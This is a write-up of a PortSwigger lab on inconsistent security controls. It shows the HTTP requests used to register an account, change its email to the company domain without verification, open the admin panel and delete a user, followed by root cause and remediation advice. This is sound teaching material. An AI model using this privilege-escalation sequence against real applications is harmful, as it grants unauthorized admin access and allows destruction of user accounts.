# PortSwigger Lab: Inconsistent security controls

# TAGS: Business Logic, Access Control, Email Domain, Burp Suite

Category: Business Logic
Date: October 14, 2026
Day: Wednesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. Here the application enforces the admin restriction based on the user's email domain, but it does so inconsistently between the registration and the profile. I show how I registered a normal user and then changed its email to the company domain, which unlocked the admin panel.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says that the application's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. The goal is to access the admin panel and delete the user `carlos`.

When I opened the registration page, it had a notice for employees:

> If you work for DontWannaCry, please use your @dontwannacry.com email address

This told me two things: the company domain is `dontwannacry.com`, and the admin access is probably tied to the email domain. But I could not simply register with a `@dontwannacry.com` email because I would not be able to receive the confirmation email.

So I registered with the email provided by the lab's email client (the `attacker@…` mailbox I can read):

```http
POST /register HTTP/2
Host: 0a980011034048cb806e44d70016001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=rhOhlqwnrsMUBAeawUoaehMw6ESPiC9v&username=admin&email=attacker%40exploit-0a18004003654874800b4373010e00c7.exploit-server.net&password=123
```

The registration returned a confirmation link, which I opened:

```http
GET /register?temp-registration-token=YjQoqFAlDX1GNOX520agLKEgcQ6C7pr9 HTTP/2
```

---

## Exploitation:

#### Step 1: Log in as the new user

With the account confirmed, I logged in:

```http
POST /login HTTP/2
Host: 0a980011034048cb806e44d70016001a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=rhOhlqwnrsMUBAeawUoaehMw6ESPiC9v&username=admin&password=123
```

The response redirected me to `/my-account?id=admin`.

#### Step 2: Change the email to the company domain

To my joy, the account page had a "change email" function. I used it to change my email to a `@dontwannacry.com` address:

```http
POST /my-account/change-email HTTP/2
Host: 0a980011034048cb806e44d70016001a.web-security-academy.net
Cookie: session=<SESSION>
Content-Type: application/x-www-form-urlencoded

email=admin%40dontwannacry.com&csrf=tpb9zLbPRpSzxHZgISohOHaAmVBkd0DY
```

```http
HTTP/2 302 Found
Location: /my-account?id=admin
```

The key detail here is that the change-email function accepted the company domain without the same restriction (or verification) as the registration.

#### Step 3: Access the admin panel and delete carlos

With the email now on `@dontwannacry.com`, I navigated to the admin panel:

```http
GET /admin HTTP/2
```

This time the response was the admin panel (instead of an "access denied" message). From there I deleted `carlos`:

```http
GET /admin/delete?username=carlos HTTP/2
```

```http
HTTP/2 302 Found
Location: /admin
```

The lab was solved.

---

## Root Cause

The application checks the email domain to decide who is an employee, but it applies this check inconsistently. The registration warns that employees should use `@dontwannacry.com`, but registering with that domain is not practical (you cannot receive the confirmation email). The "change email" feature, however, allows setting any email — including the company domain — without the same validation or verification. So a normal user can self-promote to an employee simply by changing their email.

---

## Impact

An attacker can grant themselves administrative privileges by changing a profile field, then access internal functionality and delete users or otherwise compromise the application. The inconsistency between two controls (registration vs. email change) effectively removes the access-control barrier.

---

## Remediation

To prevent this issue, applications should:

- Enforce access-control rules consistently in every place that can affect them (registration, profile updates, admin checks);
- Never derive privileges from a user-controlled field without verifying it (e.g. verifying the email before granting access);
- Require email verification when the domain changes, and restrict corporate domains to real employees;
- Centralize authorization logic so it cannot be bypassed by a single profile edit.

---

## Key Takeaways

1. The admin check was based on the email domain, but the email domain was user-controllable via the change-email feature.
2. Registration and email-change enforced different rules — that inconsistency is the flaw.
3. A single profile field can be the difference between a normal user and an admin.
4. Always verify (not just trust) any value that grants privileges.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Inconsistent security controls (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
